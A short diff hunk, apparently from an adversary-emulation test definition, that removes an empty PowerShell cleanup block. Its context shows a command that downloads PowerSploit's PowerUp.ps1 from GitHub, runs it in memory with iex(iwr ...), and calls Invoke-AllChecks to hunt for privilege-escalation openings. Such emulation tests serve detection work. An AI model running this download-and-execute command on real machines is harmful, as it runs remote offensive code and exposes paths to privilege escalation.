@@ -20,6 +20,3 @@ steps:
         iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)
         Invoke-AllChecks
       executor: powershell
-      cleanup:
-        inline: ""
-        executor: powershell
